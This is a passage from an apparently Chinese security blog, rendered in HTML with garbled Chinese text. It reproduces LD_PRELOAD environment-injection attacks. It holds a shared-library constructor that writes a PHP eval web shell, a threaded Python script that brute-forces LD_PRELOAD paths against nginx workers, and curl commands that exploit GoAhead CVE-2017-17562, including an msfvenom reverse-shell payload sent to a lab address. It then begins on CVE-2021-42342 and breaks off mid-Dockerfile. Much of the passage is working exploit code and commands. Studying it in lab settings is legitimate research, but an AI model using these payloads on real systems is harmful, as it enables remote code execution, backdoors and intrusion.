&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;echo &lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">$_POST[cmd]);?&amp;gt;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200"> &amp;gt; /var/www/html/ame.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -fPIC -shared evil.c -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://127.0.0.1:30002/index.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">nginx_workers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">13&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">14&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">15&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">17&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">21&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">24&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">25&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">26&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">27&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">done&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">uploader&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] starting uploader&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exp.so&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;rb&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">done&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">URL2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">uploader&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">bruter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">done&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">done&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] brute loop restarted: &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">URL2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;env&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=/proc/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/fd/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">pid&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">nginx_workers&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">bruter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pid&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="real-world">Real World&lt;/h2>
&lt;h3 id="goahead--cve-2017-17562">GoAhead / CVE-2017-17562&lt;/h3>
&lt;p>GoAhead: 2.5 ~ 3.6.5&lt;/p>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md">å¤ç° - vulhub&lt;/a> | &lt;a href="https://www.elttam.com/blog/goahead/#content">REMOTE LD_PRELOAD EXPLOITATION GoAhead: Make My Day&lt;/a>&lt;/p>
&lt;p>GoAheadå¯ä»¥è¿è¡Œaspï¼Œjså’Œæ ‡å‡†çš„CGIç¨‹åºï¼Œæ¼æ´å‘ç”Ÿåœ¨è¿è¡ŒCGIç¨‹åºæ—¶&lt;/p>
&lt;p>åœ¨æ”¶åˆ°è¯·æ±‚åä¼šä»urlå‚æ•°ä¸­å–å‡ºé”®å€¼å¯¹å¹¶æ³¨å†Œè¿›CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œä¸”åªè¿‡æ»¤äº†&lt;code>REMOTE_HOST&lt;/code>å’Œ&lt;code>HTTP_AUTHORIZATION&lt;/code>ï¼Œè€ŒLinuxä¸‹&lt;code>LD_&lt;/code>å¼€å¤´çš„ç¯å¢ƒå˜é‡å’ŒåŠ¨æ€é“¾æ¥åº“æœ‰å…³ï¼Œæ¯”å¦‚&lt;code>LD_PRELOAD&lt;/code>æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¼šè‡ªåŠ¨åŠ è½½ï¼Œ&lt;code>LD_LIBRARY_PATH&lt;/code>æŒ‡å®šçš„è·¯å¾„ï¼Œç¨‹åºä¼šå»å…¶ä¸­å¯»æ‰¾åŠ¨æ€é“¾æ¥åº“&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æŒ‡å®š&lt;code>LD_PRELOAD=/proc/self/fd/0&lt;/code>ï¼Œå› ä¸º&lt;code>/proc/self/fd/0&lt;/code>æ˜¯æ ‡å‡†è¾“å…¥ï¼Œè€ŒCGIç¨‹åºä¸­ï¼ŒPOSTæ•°æ®æµå³ä¸ºæ ‡å‡†è¾“å…¥æµï¼Œæˆ‘ä»¬å‘é€.soç»™&lt;code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&lt;/code>ï¼ŒCGIå°±ä¼šåŠ è½½æˆ‘ä»¬å‘é€çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆRCE&lt;/p>
&lt;p>æµ‹è¯•ä¸€ä¸ªhello worldçš„.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">__attribute__&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">constructor&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">before_main&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello: World!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC hello.c -o hello.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -X POST --data-binary @hello.so &lt;span style="color:#d88200">&amp;#34;url/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322204516436.png" alt="image-20220322204516436">&lt;/p>
&lt;p>æˆåŠŸä½œä¸ºå“åº”å¤´è¾“å‡ºï¼›å°è¯•åå¼¹shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8426&lt;/span> -f elf-so -o p.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -X POST --data-binary @p.so &lt;span style="color:#d88200">&amp;#34;http://192.168.31.214:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&amp;#34;&lt;/span> -i
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322213915833.png" alt="image-20220322213915833">&lt;/p>
&lt;h3 id="goahead--cve-2021-42342">GoAhead / CVE-2021-42342&lt;/h3>
&lt;p>&lt;a href="https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2021-42342/README.zh-cn.md">å¤ç° - vulhub&lt;/a> | &lt;a href="https://tttang.com/archive/1399/">GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®°&lt;/a>&lt;/p>
&lt;p>æ–°çš„æ´æ˜¯å¯¹ä¹‹å‰çš„ä¸€æ¬¡ç»•è¿‡ï¼Œè¡¥ä¸å¯¹ç”¨æˆ·ä¼ å…¥å‚æ•°è¿›è¡Œäº†é»‘åå•è¿‡æ»¤ï¼Œ&lt;code>LD_PRELOAD&lt;/code>è¿™ç±»å‚æ•°ä¸å†è®¾ç½®ä¸ºç¯å¢ƒå˜é‡ï¼Œä½†ç”±äºè¿™ä¸ªé™åˆ¶ä½¿ç”¨é”™äº†å‡½æ•°ï¼Œå¯¼è‡´å®é™…ä¸Šå¹¶æ²¡æœ‰ç”Ÿæ•ˆï¼›è¡¥ä¸è¿˜å°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•°åå‰é¢å¢åŠ äº†å‰ç¼€ï¼Œå¯¼è‡´æ— æ³•åŠ«æŒä»»æ„ç¯å¢ƒå˜é‡ï¼Œä½†è¿™ä¸ªé™åˆ¶æ¼æ‰äº†multipartçš„POSTåŒ…ï¼Œæ‰€ä»¥æ”»å‡»è€…é€šè¿‡è¿™ä¸ªæ–¹å¼ä»ç„¶å¯ä»¥æ³¨å…¥ä»»æ„ç¯å¢ƒå˜é‡&lt;/p>
&lt;p>æ³¨æ„ï¼Œæ–°ç‰ˆæœ¬çš„GoAheadé»˜è®¤æ²¡æœ‰å¼€å¯CGIï¼Œè€Œè€ç‰ˆæœ¬å¦‚æœæ²¡æœ‰cgi-binç›®å½•ï¼Œæˆ–è€…é‡Œé¢æ²¡æœ‰cgiæ–‡ä»¶ï¼Œä¹Ÿä¸å—è¿™ä¸ªæ¼æ´å½±å“&lt;/p>
&lt;p>æ—§çš„æ´æ˜¯é€šè¿‡è®¾ç½®&lt;code>LD_PRELOAD=/proc/self/fd/0&lt;/code> åŒæ—¶å°†æ¶æ„.soä½œä¸ºbodyä¼ å…¥ï¼Œåšåˆ°rceçš„æ•ˆæœï¼Œè€Œè¿™é‡Œæˆ‘ä»¬éœ€è¦åœ¨bodyä¸­å‘é€ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©æå‰åœ¨æœåŠ¡å™¨ä¸Šä¸Šä¼ .soï¼Œä¹‹åå†æŠŠ&lt;code>LD_PRELOAD&lt;/code>è®¾ç½®ä¸ºè¿™ä¸ªæ–‡ä»¶çš„è·¯å¾„&lt;/p>
&lt;p>ä¸PHPä¸€æ ·ï¼ŒGoAheadåœ¨é‡åˆ°ä¸Šä¼ å†…å®¹æ—¶ä¼šå­˜åœ¨ä¸´æ—¶æ–‡ä»¶ï¼Œä¸è¿‡è¿™é‡Œçš„å‘åœ¨äºä¸´æ—¶æ–‡ä»¶çš„ç›®å½•é…ç½®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ifndef ME_GOAHEAD_UPLOAD_DIR
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">#define ME_GOAHEAD_UPLOAD_DIR &amp;#34;tmp&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PUBLIC&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">websUploadOpen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ME_GOAHEAD_UPLOAD_DIR&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#if ME_WIN_LIKE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;TEMP&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#else
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;/tmp&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#endif
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">trace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Upload directory is %s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uploadDir&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">websDefineHandler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;upload&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">uploadHandler&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœå®&lt;code>ME_GOAHEAD_UPLOAD_DIR&lt;/code>æ²¡æœ‰å®šä¹‰ï¼Œåˆ™&lt;code>uploadDir=/tmp&lt;/code>ï¼Œè€Œè¿™ä¸ªå®ä¸€å®šä¸ä¸ºç©ºï¼Œæ‰€ä»¥ç›´æ¥å°±æ˜¯&lt;code>tmp&lt;/code>ï¼Œè¿™ä¸ªç›¸å¯¹ç›®å½•å–å†³äºpwdï¼Œè€Œpwdæ˜¯GoAheadå¯åŠ¨æ—¶&lt;code>--home&lt;/code>å‚æ•°æŒ‡å®šçš„ï¼Œæ˜¯å­˜æ”¾é…ç½®æ–‡ä»¶çš„ç›®å½•&lt;/p>
&lt;p>å¦‚æœ&lt;code>--home /etc/goahead&lt;/code>ï¼Œé‚£ä¸´æ—¶æ–‡ä»¶é»˜è®¤åœ¨&lt;code>/etc/goahead/tmp&lt;/code>ï¼Œå¦‚æœè¿™ä¸ªç›®å½•ä¸å­˜åœ¨æˆ–è€…ä¸å¯å†™ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°ä¸Šä¼ æ—¶500ï¼Œä¸€æ—¦ç›®æ ‡æ²¡æœ‰æ­£å¸¸é…ç½®è¿™ä¸ªç›®å½•ï¼Œå°±æ— æ³•æ”»å‡»ï¼ˆæˆ–è€…å‚è§pbCTF2021 advancementçš„wpï¼Œä½¿ç”¨python&lt;/p>
&lt;p>è¿™é‡Œç›´æ¥ä¿®æ”¹Dockerfileæ¥æŒ‡å®šä¸´æ—¶æ–‡ä»¶ç›®å½•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-dockerfile" data-lang="dockerfile">&lt;span style="display:flex;">&lt;span>make &lt;span style="color:#111">SHOW&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#111">ME_GOAHEAD_UPLOAD_DIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;\&amp;#34;/tmp\&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
